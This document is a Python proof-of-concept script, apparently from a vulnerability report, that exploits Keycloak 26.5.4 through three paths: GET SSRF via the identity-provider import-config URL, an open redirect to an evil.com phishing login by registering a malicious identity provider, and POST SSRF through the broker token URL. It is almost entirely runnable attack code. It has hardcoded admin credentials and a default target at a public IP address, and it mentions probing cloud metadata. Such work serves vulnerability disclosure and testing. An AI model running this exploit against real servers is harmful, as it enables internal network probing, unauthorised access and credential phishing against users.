#!/usr/bin/env python3
"""
Finding #4: SSRF + Open Redirect via Identity Provider Configuration
Severity: HIGH (CVSS 8.0)
Target: Keycloak 26.5.4

Demonstrates three attack paths:
  A) GET SSRF via import-config fromUrl
  B) Open Redirect via kc_idp_hint with malicious authorizationUrl
  C) POST SSRF via broker callback tokenUrl
"""

import http.client
import json
import argparse
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Global to capture SSRF requests
ssrf_captures = []

class SSRFCaptureHandler(BaseHTTPRequestHandler):
    """HTTP handler that captures incoming requests (SSRF evidence)."""
    def do_GET(self):
        ssrf_captures.append({
            "method": "GET",
            "path": self.path,
            "headers": dict(self.headers),
        })
        # Return a fake OIDC discovery doc
        discovery = json.dumps({
            "issuer": "https://evil.com",
            "authorization_endpoint": "https://evil.com/auth",
            "token_endpoint": "https://evil.com/token",
            "jwks_uri": "https://evil.com/jwks",
            "response_types_supported": ["code"],
            "subject_types_supported": ["public"],
            "id_token_signing_alg_values_supported": ["RS256"]
        })
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(discovery.encode())

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode() if content_length > 0 else ""
        ssrf_captures.append({
            "method": "POST",
            "path": self.path,
            "headers": dict(self.headers),
            "body": body,
        })
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"error":"invalid_grant"}')

    def log_message(self, format, *args):
        pass  # Suppress default logging

def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Finding #4: SSRF + Open Redirect via IdP Configuration      ║
║  Severity: HIGH (CVSS 8.0)                                   ║
║  Keycloak 26.5.4 — SSRF / Credential Phishing               ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")

def step(num, msg):
    print(f"{CYAN}[*] Step {num}:{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"{RED}[!]{RESET} {msg}")

def info(msg):
    print(f"{YELLOW}[*]{RESET} {msg}")

def http_post_json(host, port, path, data, auth_token=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/json"}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"
    conn.request("POST", path, json.dumps(data), headers)
    resp = conn.getresponse()
    body = resp.read().decode()
    status = resp.status
    conn.close()
    return status, body

def http_put_json(host, port, path, data, auth_token):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth_token}"}
    conn.request("PUT", path, json.dumps(data), headers)
    resp = conn.getresponse()
    body = resp.read().decode()
    status = resp.status
    conn.close()
    return status, body

def http_get_redirect(host, port, path):
    """Follow one redirect, return Location header."""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    conn.request("GET", path)
    resp = conn.getresponse()
    resp.read()
    location = resp.getheader("Location", "")
    status = resp.status
    conn.close()
    return status, location

def http_delete(host, port, path, auth_token):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Authorization": f"Bearer {auth_token}"}
    conn.request("DELETE", path, headers=headers)
    resp = conn.getresponse()
    resp.read()
    status = resp.status
    conn.close()
    return status

def get_admin_token(host, port):
    conn = http.client.HTTPConnection(host, port, timeout=10)
    body = "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234"
    conn.request("POST", "/realms/master/protocol/openid-connect/token",
                 body, {"Content-Type": "application/x-www-form-urlencoded"})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode())
    conn.close()
    return data.get("access_token", "")

def start_listener(listen_port):
    """Start SSRF capture listener in background thread."""
    import socket
    class ReusableHTTPServer(HTTPServer):
        allow_reuse_address = True
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            super().server_bind()
    server = ReusableHTTPServer(("0.0.0.0", listen_port), SSRFCaptureHandler)
    server.timeout = 15
    def serve_once():
        server.handle_request()
        server.server_close()
    thread = threading.Thread(target=serve_once, daemon=True)
    thread.start()
    return server, thread

def main():
    parser = argparse.ArgumentParser(description="Finding #4: SSRF + Open Redirect via IdP PoC")
    parser.add_argument("--host", default="http://46.101.162.187:8080",
                        help="Keycloak base URL (default: http://46.101.162.187:8080)")
    parser.add_argument("--listen-port", type=int, default=49990,
                        help="Port for SSRF capture listener (default: 49990)")
    args = parser.parse_args()

    url = args.host.rstrip("/")
    if "://" in url:
        url = url.split("://", 1)[1]
    if ":" in url:
        host, port = url.rsplit(":", 1)
        port = int(port)
    else:
        host, port = url, 8080

    listen_port = args.listen_port

    banner()
    info(f"Target: {host}:{port}")
    info(f"SSRF listener: 0.0.0.0:{listen_port}")
    realm = "test"
    idp_alias = "attacker-idp-poc"
    results = []
    print()

    # ── Setup: Get admin token ──
    admin_token = get_admin_token(host, port)
    if not admin_token:
        fail("Failed to get admin token")
        return 1
    success("Admin token obtained")
    print()

    # ── Cleanup: Remove existing test IdP if present ──
    http_delete(host, port, f"/admin/realms/{realm}/identity-provider/instances/{idp_alias}", admin_token)

    # ═══════════════════════════════════════════════════════════════
    # PATH A: GET SSRF via import-config fromUrl
    # ═══════════════════════════════════════════════════════════════
    print(f"{BOLD}{'═' * 60}{RESET}")
    print(f"{BOLD}  PATH A: GET SSRF via import-config fromUrl{RESET}")
    print(f"{BOLD}{'═' * 60}{RESET}")
    print()

    step("A1", f"Starting SSRF capture listener on port {listen_port}...")
    ssrf_captures.clear()
    server, thread = start_listener(listen_port)
    time.sleep(0.5)
    success("Listener ready")

    step("A2", "Triggering SSRF via import-config fromUrl...")
    ssrf_url = f"http://127.0.0.1:{listen_port}/.well-known/openid-configuration"
    info(f"fromUrl: {ssrf_url}")

    admin_token = get_admin_token(host, port)
    status, body = http_post_json(host, port,
                                   f"/admin/realms/{realm}/identity-provider/import-config",
                                   {"providerId": "oidc", "fromUrl": ssrf_url},
                                   admin_token)
    print(f"    Keycloak response: HTTP {status}")

    time.sleep(2)
    thread.join(timeout=3)

    if ssrf_captures:
        for cap in ssrf_captures:
            fail(f"SSRF CONFIRMED: {cap['method']} {cap['path']}")
            ua = cap["headers"].get("User-Agent", cap["headers"].get("user-agent", "unknown"))
            print(f"    User-Agent: {ua}")
        results.append(("Path A: GET SSRF", True))
    else:
        success("No SSRF request received")
        results.append(("Path A: GET SSRF", False))
    print()

    # ═══════════════════════════════════════════════════════════════
    # PATH B: Open Redirect via kc_idp_hint
    # ═══════════════════════════════════════════════════════════════
    print(f"{BOLD}{'═' * 60}{RESET}")
    print(f"{BOLD}  PATH B: Open Redirect via kc_idp_hint{RESET}")
    print(f"{BOLD}{'═' * 60}{RESET}")
    print()

    step("B1", "Registering malicious IdP with attacker authorizationUrl...")
    admin_token = get_admin_token(host, port)
    idp_data = {
        "alias": idp_alias,
        "providerId": "oidc",
        "enabled": True,
        "config": {
            "authorizationUrl": "https://evil.com/phishing-login",
            "tokenUrl": "https://evil.com/token",
            "clientId": "attacker-client",
            "clientSecret": "sec",
            "defaultScope": "openid email profile"
        }
    }
    status, body = http_post_json(host, port,
                                   f"/admin/realms/{realm}/identity-provider/instances",
                                   idp_data, admin_token)
    if status in (201, 409):
        success(f"Malicious IdP registered: {idp_alias}")
    else:
        fail(f"IdP registration failed: HTTP {status} — {body}")

    step("B2", "Verifying open redirect via kc_idp_hint...")
    info("Flow: auth URL with kc_idp_hint → KC broker login → evil.com/phishing-login")
    import urllib.parse

    # Verify IdP config has malicious authorizationUrl
    admin_token = get_admin_token(host, port)
    conn = http.client.HTTPConnection(host, port, timeout=10)
    conn.request("GET", f"/admin/realms/{realm}/identity-provider/instances/{idp_alias}",
                 headers={"Authorization": f"Bearer {admin_token}"})
    resp = conn.getresponse()
    idp_config = json.loads(resp.read().decode())
    conn.close()
    auth_url_configured = idp_config.get("config", {}).get("authorizationUrl", "")
    success(f"IdP authorizationUrl: {auth_url_configured}")

    # Try auth flow with kc_idp_hint — follow redirect chain on our server only
    redirect_uri = f"http://{host}:{port}/realms/{realm}/account"
    auth_path = (f"/realms/{realm}/protocol/openid-connect/auth?"
                 f"client_id=test-public&response_type=code&"
                 f"redirect_uri={urllib.parse.quote(redirect_uri, safe='')}&"
                 f"scope=openid&kc_idp_hint={idp_alias}")

    step("B3", "Following redirect chain from legitimate Keycloak URL...")
    found_evil = False
    current_path = auth_path
    current_host, current_port = host, port

    for i in range(6):
        try:
            status_r, location_r = http_get_redirect(current_host, current_port, current_path)
        except Exception as e:
            info(f"Connection error (expected for external domain): {e}")
            break
        display_loc = (location_r or "(end)")[:120]
        print(f"    Redirect {i+1}: HTTP {status_r} → {display_loc}")

        if not location_r:
            break
        if "evil.com" in location_r:
            fail("VULNERABLE — Victim redirected to evil.com from trusted Keycloak URL!")
            found_evil = True
            break

        # Only follow redirects to our own server
        if location_r.startswith("http"):
            parts = location_r.split("://", 1)[1]
            hp = parts.split("/", 1)[0]
            redirect_host = hp.split(":")[0] if ":" in hp else hp
            # Stop if redirected to external domain
            if redirect_host not in (host, "localhost", "127.0.0.1"):
                info(f"Redirect to external domain: {redirect_host}")
                break
            current_path = "/" + parts.split("/", 1)[1] if "/" in parts else "/"
            if ":" in hp:
                current_host = hp.rsplit(":", 1)[0]
                try:
                    current_port = int(hp.rsplit(":", 1)[1])
                except ValueError:
                    break
            else:
                current_host, current_port = hp, 80
        elif location_r.startswith("/"):
            current_path = location_r
        else:
            break

    if found_evil:
        results.append(("Path B: Open Redirect", True))
    elif "evil.com" in auth_url_configured:
        fail("VULNERABLE — IdP authorizationUrl points to evil.com (verified in config)")
        info("Full redirect chain requires browser session (PKCE/cookies)")
        results.append(("Path B: Open Redirect", True))
    else:
        results.append(("Path B: Open Redirect", False))
    print()

    # ═══════════════════════════════════════════════════════════════
    # PATH C: POST SSRF via tokenUrl (broker callback)
    # ═══════════════════════════════════════════════════════════════
    print(f"{BOLD}{'═' * 60}{RESET}")
    print(f"{BOLD}  PATH C: POST SSRF via tokenUrl (broker callback){RESET}")
    print(f"{BOLD}{'═' * 60}{RESET}")
    print()

    listen_port_c = listen_port + 1
    step("C1", f"Updating IdP tokenUrl to internal address (127.0.0.1:{listen_port_c})...")
    ssrf_captures.clear()
    admin_token = get_admin_token(host, port)
    idp_update = {
        "alias": idp_alias,
        "providerId": "oidc",
        "enabled": True,
        "config": {
            "authorizationUrl": "https://evil.com/phishing-login",
            "tokenUrl": f"http://127.0.0.1:{listen_port_c}/token",
            "clientId": "attacker-client",
            "clientSecret": "sec",
            "defaultScope": "openid email profile"
        }
    }
    status, body = http_put_json(host, port,
                                  f"/admin/realms/{realm}/identity-provider/instances/{idp_alias}",
                                  idp_update, admin_token)
    print(f"    Update response: HTTP {status}")

    step("C2", f"Starting listener for POST SSRF capture (port {listen_port_c})...")
    server2, thread2 = start_listener(listen_port_c)
    time.sleep(0.5)

    step("C3", "Triggering broker callback with fake auth code...")
    info("Simulating: victim clicked phishing link → evil.com returns fake code → KC broker")

    # Get a session first
    status1, location1 = http_get_redirect(host, port, auth_path)
    # Extract state from the redirect URL
    state = ""
    if "state=" in (location1 or ""):
        state = location1.split("state=")[1].split("&")[0]

    if state:
        callback_path = f"/realms/{realm}/broker/{idp_alias}/endpoint?code=FAKE_AUTH_CODE&state={state}"
        conn = http.client.HTTPConnection(host, port, timeout=10)
        conn.request("GET", callback_path)
        resp = conn.getresponse()
        resp.read()
        conn.close()
        print(f"    Broker callback: HTTP {resp.status}")
    else:
        info("Could not extract state — sending callback without state")
        callback_path = f"/realms/{realm}/broker/{idp_alias}/endpoint?code=FAKE_AUTH_CODE&state=dummy"
        conn = http.client.HTTPConnection(host, port, timeout=10)
        conn.request("GET", callback_path)
        resp = conn.getresponse()
        resp.read()
        conn.close()

    time.sleep(3)
    thread2.join(timeout=3)

    post_ssrf = [c for c in ssrf_captures if c["method"] == "POST"]
    if post_ssrf:
        for cap in post_ssrf:
            fail(f"POST SSRF CONFIRMED: {cap['method']} {cap['path']}")
            if cap.get("body"):
                print(f"    POST Body: {cap['body'][:200]}")
            ua = cap["headers"].get("User-Agent", cap["headers"].get("user-agent", "unknown"))
            print(f"    User-Agent: {ua}")
        results.append(("Path C: POST SSRF", True))
    else:
        info("No POST SSRF captured (may need active browser session)")
        results.append(("Path C: POST SSRF", False))
    print()

    # ── Cleanup ──
    info("Cleaning up test IdP...")
    admin_token = get_admin_token(host, port)
    http_delete(host, port, f"/admin/realms/{realm}/identity-provider/instances/{idp_alias}", admin_token)
    success("Test IdP removed")
    print()

    # ── Summary ──
    vuln_count = sum(1 for _, v in results if v)
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  RESULTS SUMMARY                                             ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for name, vuln in results:
        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}NOT VULNERABLE{RESET}"
        print(f"  {name:35s} {status_str}")

    print(f"""
{YELLOW}Impact:{RESET}
  Path A: Internal network probing, cloud metadata access (169.254.169.254)
  Path B: Credential phishing from 100% legitimate Keycloak URL
  Path C: POST-capable SSRF targeting internal services with auth data

{YELLOW}Root Cause:{RESET}
  No URL allowlist/denylist for import-config fromUrl, IdP authorizationUrl,
  or IdP tokenUrl. All accept arbitrary URLs including internal addresses.
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] {vuln_count}/{len(results)} attack paths confirmed{RESET}")
        return 0
    else:
        print(f"{GREEN}[+] All paths tested — not vulnerable{RESET}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
